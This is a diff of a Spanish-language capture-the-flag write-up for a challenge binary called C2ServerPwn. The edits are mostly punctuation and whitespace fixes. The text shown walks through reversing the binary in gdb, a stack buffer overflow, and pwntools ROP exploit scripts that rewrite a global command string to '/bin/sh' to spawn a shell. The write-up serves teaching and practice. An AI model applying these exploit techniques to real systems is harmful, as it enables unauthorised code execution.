@@ -144,25 +144,25 @@
 <section class="post" id="reversing">
 <br><h3 class="post-title">Reversing</h3><br>
 
-<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackDef/C2ServerPwn/chal">binario</a> que se otorga muestra un mensaje de bienvenida y pide datos como entrado y los exfiltra, de primeras no queda muy clara su función</p>
+<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackDef/C2ServerPwn/chal">binario</a> que se otorga muestra un mensaje de bienvenida y pide datos como entrado y los exfiltra, de primeras no queda muy clara su función.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ./chal</span><span class="p">
-Servicio de exfiltracion Ocelot v0.1  
+Servicio de exfiltracion Ocelot v0.1
 Recibiendo datos...
 AAAAAAAABBBBBBBB
 Datos exfiltrados</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciamos desensamblando el binario, la función <code class="language-plaintext highlighter-rouge">main</code> guarda en una variable <code class="language-plaintext highlighter-rouge">command</code> una string que ejecuta un <code class="language-plaintext highlighter-rouge">echo</code>, además declara un iterador <code class="language-plaintext highlighter-rouge">i</code> en <code class="language-plaintext highlighter-rouge">0</code></p>
+<p class="plain-text">Iniciamos desensamblando el binario, la función <code class="language-plaintext highlighter-rouge">main</code> guarda en una variable <code class="language-plaintext highlighter-rouge">command</code> una string que ejecuta un <code class="language-plaintext highlighter-rouge">echo</code>, además declara un iterador <code class="language-plaintext highlighter-rouge">i</code> en <code class="language-plaintext highlighter-rouge">0</code>.</p>
 <a href="/challenges/c2serverpwn/1.png" target="_blank"><div><p><img src="/challenges/c2serverpwn/1.png"></p></div></a>
 
-<p class="plain-text">Luego en un bucle que se ejecuta <code class="language-plaintext highlighter-rouge">n</code> veces donde n es la longitud la variable <code class="language-plaintext highlighter-rouge">command</code>, en cada iteración llama a la función <code class="language-plaintext highlighter-rouge">updateCommand</code> pasandole como argumentos el iterador y el contenido de la variable <code class="language-plaintext highlighter-rouge">command</code> en la posición <code class="language-plaintext highlighter-rouge">i</code>, una vez que termina el bucle llama a <code class="language-plaintext highlighter-rouge">vuln</code> y finalmente a la función <code class="language-plaintext highlighter-rouge">execCommand</code></p>
+<p class="plain-text">Luego en un bucle que se ejecuta <code class="language-plaintext highlighter-rouge">n</code> veces donde n es la longitud la variable <code class="language-plaintext highlighter-rouge">command</code>, en cada iteración llama a la función <code class="language-plaintext highlighter-rouge">updateCommand</code> pasandole como argumentos el iterador y el contenido de la variable <code class="language-plaintext highlighter-rouge">command</code> en la posición <code class="language-plaintext highlighter-rouge">i</code>, una vez que termina el bucle llama a <code class="language-plaintext highlighter-rouge">vuln</code> y finalmente a la función <code class="language-plaintext highlighter-rouge">execCommand</code>.</p>
 <a href="/challenges/c2serverpwn/2.png" target="_blank"><div><p><img src="/challenges/c2serverpwn/2.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">updateCommand</code> recibe el indice y un byte, simplemente mueve el <code class="language-plaintext highlighter-rouge">byte</code> a la variable <code class="language-plaintext highlighter-rouge">command</code> en la posición <code class="language-plaintext highlighter-rouge">i</code>, podriamos escribirlo como <code class="language-plaintext highlighter-rouge">command[i] = byte</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">updateCommand</code> recibe el indice y un byte, simplemente mueve el <code class="language-plaintext highlighter-rouge">byte</code> a la variable <code class="language-plaintext highlighter-rouge">command</code> en la posición <code class="language-plaintext highlighter-rouge">i</code>, podriamos escribirlo como <code class="language-plaintext highlighter-rouge">command[i] = byte</code>.</p>
 <a href="/challenges/c2serverpwn/5.png" target="_blank"><div><p><img src="/challenges/c2serverpwn/5.png"></p></div></a>
 
-<p class="plain-text">Para entender mejor el bucle podemos establecer un breakpoint en la llamada a <code class="language-plaintext highlighter-rouge">updateCommand</code> y vincular a el comandos que muestren ambas variables que se le pasan como argumento, la primera como <code class="language-plaintext highlighter-rouge">dword</code> y la segunda como <code class="language-plaintext highlighter-rouge">string</code></p>
+<p class="plain-text">Para entender mejor el bucle podemos establecer un breakpoint en la llamada a <code class="language-plaintext highlighter-rouge">updateCommand</code> y vincular a él, comandos que muestren ambas variables que se le pasan como argumento, la primera como <code class="language-plaintext highlighter-rouge">dword</code> y la segunda como <code class="language-plaintext highlighter-rouge">string</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ gdb </span><span class="p">-q chal
 Reading symbols from </span><span class="ve">chal</span><span class="p">...
@@ -172,19 +172,19 @@ Reading symbols from </span><span class="ve">chal</span><span class="p">...
 </span><span class="ro">pwndbg></span><span class="p"> b *0x80492de
 Punto de interrupción 1 at </span><span class="az">0x80492de
 </span><span class="ro">pwndbg></span><span class="p"> commands 1
-Type commands for breakpoint(s) 1, one per line. End with a line saying just "end".  
+Type commands for breakpoint(s) 1, one per line. End with a line saying just "end".
 >x/wx $esp
 >x/s $esp+4
 >end
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En la primera iteración se le pasa el indice <code class="language-plaintext highlighter-rouge">0</code> y la cadena <code class="language-plaintext highlighter-rouge">e</code>, entonces ejecutariamos un <code class="language-plaintext highlighter-rouge">command[0] = "e"</code>, en la segunda el indice <code class="language-plaintext highlighter-rouge">1</code> y la cadena <code class="language-plaintext highlighter-rouge">h</code> que equivale a el pseudo c <code class="language-plaintext highlighter-rouge">command[1] = "c"</code>; y así byte por byte hasta completar toda la cadena</p>
+<p class="plain-text">En la primera iteración se le pasa el indice <code class="language-plaintext highlighter-rouge">0</code> y la cadena <code class="language-plaintext highlighter-rouge">e</code>, entonces ejecutariamos un <code class="language-plaintext highlighter-rouge">command[0] = "e"</code>, en la segunda el indice <code class="language-plaintext highlighter-rouge">1</code> y la cadena <code class="language-plaintext highlighter-rouge">h</code> que equivale a el pseudo c <code class="language-plaintext highlighter-rouge">command[1] = "c"</code>; y así byte por byte hasta completar toda la cadena.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> r
 Starting program: </span><span class="ve">/home/user/chal</span><span class="p">
 [Depuración de hilo usando libthread_db enabled]
-Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
 
 Breakpoint 1,</span><span class="az"> 0x080492de</span><span class="p"> in</span><span class="am"> main</span><span class="p"> ()
 </span><span class="az">0xffffd4a0</span><span class="p">:	0x00000000
@@ -210,7 +210,7 @@ Breakpoint 1,</span><span class="az"> 0x080492de </span><span class="p">in</span
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si quitamos los <code class="language-plaintext highlighter-rouge">breakpoints</code> y continuamos podemos ver que cuando se termina el bucle ahora la variable <code class="language-plaintext highlighter-rouge">command</code> esta llena con el comando que se define al inicio</p>
+<p class="plain-text">Si quitamos los <code class="language-plaintext highlighter-rouge">breakpoints</code> y continuamos podemos ver que cuando se termina el bucle ahora la variable <code class="language-plaintext highlighter-rouge">command</code> está llena con el comando que se define al inicio.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> bc *
 </span><span class="ro">pwndbg> </span><span class="p">c
@@ -221,14 +221,14 @@ Recibiendo datos...
 Program received signal SIGINT, Interrupt.
 </span><span class="az">0xf7fc7579</span><span class="p"> in</span><span class="am"> __kernel_vsyscall </span><span class="p">()
 </span><span class="ro">pwndbg></span><span class="p"> x/s &command
-</span><span class="az">0x804c040</span><span class="p"> &lt</span><span class="am">command</span><span class="p">>:	"echo Datos exfiltrados"  
+</span><span class="az">0x804c040</span><span class="p"> &lt</span><span class="am">command</span><span class="p">>:	"echo Datos exfiltrados"
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Vamos con la función <code class="language-plaintext highlighter-rouge">execCommand</code>, esta simplemente ejecuta como comando llamando a la función <code class="language-plaintext highlighter-rouge">system</code> lo que se encuentre en la variable <code class="language-plaintext highlighter-rouge">command</code></p>
+<p class="plain-text">Vamos con la función <code class="language-plaintext highlighter-rouge">execCommand</code>, esta simplemente ejecuta como comando llamando a la función <code class="language-plaintext highlighter-rouge">system</code> lo que se encuentre en la variable <code class="language-plaintext highlighter-rouge">command</code>.</p>
 <a href="/challenges/c2serverpwn/3.png" target="_blank"><div><p><img src="/challenges/c2serverpwn/3.png"></p></div></a>
 
-<p class="plain-text">La función vuln llama a fgets <code class="language-plaintext highlighter-rouge">0x200</code> o <code class="language-plaintext highlighter-rouge">512</code> bytes en un buffer que inicia en <code class="language-plaintext highlighter-rouge">ebp - 264</code></p>
+<p class="plain-text">La función vuln llama a fgets con el fín de escribir un total de <code class="language-plaintext highlighter-rouge">0x200</code> o <code class="language-plaintext highlighter-rouge">512</code> bytes en un buffer que inicia en <code class="language-plaintext highlighter-rouge">ebp - 264</code>, aquí encontramos un clásico buffer overflow.</p>
 <a href="/challenges/c2serverpwn/4.png" target="_blank"><div><p><img src="/challenges/c2serverpwn/4.png"></p></div></a>
 
 </section>
@@ -236,7 +236,7 @@ Program received signal SIGINT, Interrupt.
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, este binario solo tiene activada la protección <code class="language-plaintext highlighter-rouge">NX</code> que nos impedirá ejecutar shellcode directamente en el stack</p>
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, este binario solo tiene activada la protección <code class="language-plaintext highlighter-rouge">NX</code> que nos impedirá ejecutar shellcode directamente en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec </span><span class="p">chal
 [</span><span class="az">*</span><span class="p">] '/home/user/chal'
@@ -244,14 +244,14 @@ Program received signal SIGINT, Interrupt.
     RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
     Stack:      </span><span class="ro">No canary found</span><span class="p">
     NX:         </span><span class="ve">NX enabled</span><span class="p">
-    PIE:        </span><span class="ro">No PIE (0x8048000)  </span>
+    PIE:        </span><span class="ro">No PIE (0x8048000)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">264 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">ebp</code>, <code class="language-plaintext highlighter-rouge">4 B's</code> que seran el valor de ebp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">4 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack</p>
+<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">264 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">ebp</code>, <code class="language-plaintext highlighter-rouge">4 B's</code> que serán el valor de ebp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">4 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">-q
 >>> b"A" * 264 + b"B" * 4 + b"C" * 4 + b"D" * 24
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDD'  
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDD'
 >>></span>
 </code></pre></div></div><br>
 
@@ -265,7 +265,7 @@ Starting program: </span><span class="ve">/home/user/chal</span><span class="p">
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
 Servicio de exfiltracion Ocelot v0.1
 Recibiendo datos...
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDD  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDDDDDDDDDDDDDDDDDD
 
 Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x43434343</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
@@ -278,21 +278,21 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ya que el <code class="language-plaintext highlighter-rouge">NX</code> esta habilitado tendremos que hacer <code class="language-plaintext highlighter-rouge">ROP</code>, sin embargo las propias funciones del programa nos ayudarán a conseguir una shell, <code class="language-plaintext highlighter-rouge">updateCommand</code> nos ayudará a escribir en la variable <code class="language-plaintext highlighter-rouge">command</code> y <code class="language-plaintext highlighter-rouge">execCommand</code> a ejecutar dicha variable</p>
+<p class="plain-text">Ya que el <code class="language-plaintext highlighter-rouge">NX</code> esta habilitado tendremos que hacer <code class="language-plaintext highlighter-rouge">ROP</code>, sin embargo las propias funciones del programa nos ayudarán a conseguir una shell, <code class="language-plaintext highlighter-rouge">updateCommand</code> nos ayudará a escribir en la variable <code class="language-plaintext highlighter-rouge">command</code> y <code class="language-plaintext highlighter-rouge">execCommand</code> a ejecutar dicha variable.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">p updateCommand 
-</span><span class="az">$1</span><span class="p"> = {&lttext variable, no debug info>}</span><span class="az"> 0x80491f3</span><span class="p"> &lt</span><span class="am">updateCommand</span><span class="p">>  
-</span><span class="ro">pwndbg></span><span class="p"> p execCommand 
+<code><span class="ro">pwndbg> </span><span class="p">p updateCommand
+</span><span class="az">$1</span><span class="p"> = {&lttext variable, no debug info>}</span><span class="az"> 0x80491f3</span><span class="p"> &lt</span><span class="am">updateCommand</span><span class="p">>
+</span><span class="ro">pwndbg></span><span class="p"> p execCommand
 </span><span class="az">$2 </span><span class="p">= {&lttext variable, no debug info>}</span><span class="az"> 0x804921d</span><span class="p"> &lt</span><span class="am">execCommand</span><span class="p">>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El primer exploit envia <code class="language-plaintext highlighter-rouge">A's</code> para rellenar el offset hasta el return address, nuestra cadena <code class="language-plaintext highlighter-rouge">ROP</code> inicia llamando a la función <code class="language-plaintext highlighter-rouge">updateCommand</code>, lo primero que se envia en el stack es la dirección de retorno que será a donde retorna al terminar la función, le pasamos el primer argumento como posición <code class="language-plaintext highlighter-rouge">0</code> y el primer caracter de la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es <code class="language-plaintext highlighter-rouge">/</code>, además enviamos unas <code class="language-plaintext highlighter-rouge">C's</code> para que se guarden en el stack</p>
+<p class="plain-text">El primer exploit envia <code class="language-plaintext highlighter-rouge">A's</code> para rellenar el offset hasta el return address, nuestra cadena <code class="language-plaintext highlighter-rouge">ROP</code> inicia llamando a la función <code class="language-plaintext highlighter-rouge">updateCommand</code>, lo primero que se envia en el stack es la dirección de retorno que será a donde retorna al terminar la función, le pasamos el primer argumento como posición <code class="language-plaintext highlighter-rouge">0</code> y el primer caracter de la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es <code class="language-plaintext highlighter-rouge">/</code>, además enviamos unas <code class="language-plaintext highlighter-rouge">C's</code> para que se guarden en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p32, u8
 
-shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "b *0x80491f3</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "b *0x80491f3</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
 
 offset</span><span class="o"> =</span><span class="mi"> 268</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
@@ -311,9 +311,9 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"...</span><
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al llegar al breakpoint establecido en <code class="language-plaintext highlighter-rouge">updateCommand</code> podemos ver en el stack el primer dword que es la dirección de retorno y luego los <code class="language-plaintext highlighter-rouge">2</code> argumentos de la función</p>
+<p class="plain-text">Al llegar al breakpoint establecido en <code class="language-plaintext highlighter-rouge">updateCommand</code> podemos ver en el stack el primer dword que es la dirección de retorno y luego los <code class="language-plaintext highlighter-rouge">2</code> argumentos de la función.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Breakpoint 1,</span><span class="az"> 0x080491f3</span><span class="p"> in</span><span class="am"> updateCommand </span><span class="p">()  
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x080491f3</span><span class="p"> in</span><span class="am"> updateCommand </span><span class="p">()
 </span><span class="ro">pwndbg></span><span class="p"> x/i $eip
 =></span><span class="az"> 0x80491f3</span><span class="p"> &lt</span><span class="am">updateCommand</span><span class="p">>:</span><span class="ve">	push</span><span class="ro">   ebp</span><span class="p">
 </span><span class="ro">pwndbg></span><span class="p"> x/wx $esp
@@ -324,10 +324,10 @@ shell.interactive()</span>
 </span><span class="az">0xffb35fb8</span><span class="p">:	"/"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Saltamos el <code class="language-plaintext highlighter-rouge">ret</code> que es el final de la función revisamos la variable global <code class="language-plaintext highlighter-rouge">command</code> y el primer caracter lo hemos modificado de <code class="language-plaintext highlighter-rouge">e</code> a <code class="language-plaintext highlighter-rouge">/</code>, además podemos ver que en el <code class="language-plaintext highlighter-rouge">ret</code> apunta a la dirección <code class="language-plaintext highlighter-rouge">0x42424242</code> que es el primer dword que habiamos enviado</p>
+<p class="plain-text">Saltamos el <code class="language-plaintext highlighter-rouge">ret</code> que es el final de la función revisamos la variable global <code class="language-plaintext highlighter-rouge">command</code> y el primer caracter lo hemos modificado de <code class="language-plaintext highlighter-rouge">e</code> a <code class="language-plaintext highlighter-rouge">/</code>, además podemos ver que en el <code class="language-plaintext highlighter-rouge">ret</code> apunta a la dirección <code class="language-plaintext highlighter-rouge">0x42424242</code> que es el primer dword que habiamos enviado.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> nextret
-Temporary breakpoint -11,</span><span class="az"> 0x0804921c</span><span class="p"> in</span><span class="am"> updateCommand </span><span class="p">()  
+Temporary breakpoint -11,</span><span class="az"> 0x0804921c</span><span class="p"> in</span><span class="am"> updateCommand </span><span class="p">()
 </span><span class="ro">pwndbg></span><span class="p"> x/s &command
 </span><span class="az">0x804c040</span><span class="p"> &lt</span><span class="am">command</span><span class="p">>:	"/cho Datos exfiltrados"
 </span><span class="ro">pwndbg></span><span class="p"> x/i $eip
@@ -337,12 +337,12 @@ Temporary breakpoint -11,</span><span class="az"> 0x0804921c</span><span class="
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Miramos al stack, al llegar a la dirección de retorno en el stack tenemos aún los <code class="language-plaintext highlighter-rouge">2</code> argumentos y luego la dirección de las <code class="language-plaintext highlighter-rouge">3 C's</code>, lo mas sencillo para seguir con el siguiente caracter seria limpiar esos <code class="language-plaintext highlighter-rouge">8</code> bytes de los <code class="language-plaintext highlighter-rouge">2</code> dwords y retornar en las <code class="language-plaintext highlighter-rouge">C's</code> para la siguiente iteración que será el <code class="language-plaintext highlighter-rouge">ropchain</code> que escriba el siguiente caracter</p>
+<p class="plain-text">Miramos al stack, al llegar a la dirección de retorno en el stack tenemos aún los <code class="language-plaintext highlighter-rouge">2</code> argumentos y luego la dirección de las <code class="language-plaintext highlighter-rouge">3 C's</code>, lo mas sencillo para seguir con el siguiente caracter sería limpiar esos <code class="language-plaintext highlighter-rouge">8</code> bytes de los <code class="language-plaintext highlighter-rouge">2</code> dwords y retornar en las <code class="language-plaintext highlighter-rouge">C's</code> para la siguiente iteración que será el <code class="language-plaintext highlighter-rouge">ropchain</code> que escriba el siguiente caracter.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> c
 Continuando.
 
-Program received signal SIGSEGV, Segmentation fault.  
+Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x42424242 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> stack 3
 00:0000│ esp </span><span class="am">0xffb35fb4</span><span class="p"> ◂— 0
@@ -351,12 +351,11 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Lo ideal seria un gadget <code class="language-plaintext highlighter-rouge">add esp, 8; ret;</code> pero aunque no existe tenemos un gadget <code class="language-plaintext highlighter-rouge">add esp, 8; pop ebx; ret;</code> por lo que necesitaremos enviar <code class="language-plaintext highlighter-rouge">4</code> bytes de padding y evitar que no salte donde debe, este stack pivot lo encontramos con <code class="language-plaintext highlighter-rouge">ropper</code></p>
+<p class="plain-text">Lo ideal seria un gadget <code class="language-plaintext highlighter-rouge">add esp, 8; ret;</code> pero aunque no existe tenemos un gadget <code class="language-plaintext highlighter-rouge">add esp, 8; pop ebx; ret;</code> por lo que necesitaremos enviar <code class="language-plaintext highlighter-rouge">4</code> bytes de padding y evitar que no salte donde debe, este stack pivot lo encontramos con <code class="language-plaintext highlighter-rouge">ropper</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ropper </span><span class="p">--file chal --stack-pivot
-</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
 </span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
-</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%  
+</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
 
 Gadgets
 =======
@@ -371,12 +370,12 @@ Gadgets
 6 gadgets found</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, nuestro exploit es un bucle que llama a <code class="language-plaintext highlighter-rouge">updateCommand</code> pasandole los 2 argumentos, la posición y el caracter, y en la dirección de retorno limpiamos el stack para pasar a la siguiente iteración hasta que se completen todos los caracteres</p>
+<p class="plain-text">Entonces, nuestro exploit es un bucle que llama a <code class="language-plaintext highlighter-rouge">updateCommand</code> pasándole los 2 argumentos, la posición y el caracter, y en la dirección de retorno limpiamos el stack para pasar a la siguiente iteración hasta que se completen todos los caracteres.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p32, u8
 
-shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "b *0x804921c</span><span class="mi">\n</span><span class="s">b *0x804921d</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "b *0x804921c</span><span class="mi">\n</span><span class="s">b *0x804921d</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
 
 offset</span><span class="o"> =</span><span class="mi"> 268</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
@@ -399,7 +398,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"...</span><
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cuando llegamos a <code class="language-plaintext highlighter-rouge">updateCommand</code> como return address tenemos el stack pivot y cuando se ejecute quitara los <code class="language-plaintext highlighter-rouge">3</code> dwords del stack y pasa al siguiente <code class="language-plaintext highlighter-rouge">updateCommand</code></p>
+<p class="plain-text">Cuando llegamos a <code class="language-plaintext highlighter-rouge">updateCommand</code> como return address tenemos el stack pivot y cuando se ejecute quitará los <code class="language-plaintext highlighter-rouge">3</code> dwords del stack y pasa al siguiente <code class="language-plaintext highlighter-rouge">updateCommand</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Breakpoint 1, </span><span class="az">0x0804921c</span><span class="p"> in</span><span class="am"> updateCommand </span><span class="p">()
 </span><span class="ro">pwndbg></span><span class="p"> x/i $eip
@@ -413,16 +412,16 @@ shell.interactive()</span>
 01:0004│     </span><span class="am">0xffa63e04</span><span class="p"> ◂— 0
 02:0008│     </span><span class="am">0xffa63e08</span><span class="p"> ◂— 0x2f /* '/' */
 03:000c│     </span><span class="am">0xffa63e0c</span><span class="p"> ◂— 0x41414141 ('AAAA')
-04:0010│     </span><span class="am">0xffa63e10</span><span class="p"> —▸</span><span class="ro"> 0x80491f3 (updateCommand)</span><span class="p"> ◂—</span><span class="na"> push</span><span class="no"> ebp  
+04:0010│     </span><span class="am">0xffa63e10</span><span class="p"> —▸</span><span class="ro"> 0x80491f3 (updateCommand)</span><span class="p"> ◂—</span><span class="na"> push</span><span class="no"> ebp
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cuando terminamos los bucles y llegamos a <code class="language-plaintext highlighter-rouge">execCommand</code> la variable global <code class="language-plaintext highlighter-rouge">command</code> ahora contiene toda la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> y al ejecutarse nos devuelve una shell</p>
+<p class="plain-text">Cuando terminamos los bucles y llegamos a <code class="language-plaintext highlighter-rouge">execCommand</code> la variable global <code class="language-plaintext highlighter-rouge">command</code> ahora contiene toda la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> y al ejecutarse nos devuelve una shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> bc 1
 </span><span class="ro">pwndbg> </span><span class="p">c
 Continuando.
-Breakpoint 2,</span><span class="az"> 0x0804921d</span><span class="p"> in</span><span class="am"> execCommand</span><span class="p"> ()  
+Breakpoint 2,</span><span class="az"> 0x0804921d</span><span class="p"> in</span><span class="am"> execCommand</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> x/i $eip
 =></span><span class="az"> 0x804921d</span><span class="p"> &lt</span><span class="am">execCommand</span><span class="p">>:</span><span class="ve">	push</span><span class="ro">   ebp</span><span class="p">
 </span><span class="ro">pwndbg></span><span class="p"> x/s &command
@@ -430,7 +429,7 @@ Breakpoint 2,</span><span class="az"> 0x0804921d</span><span class="p"> in</span
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
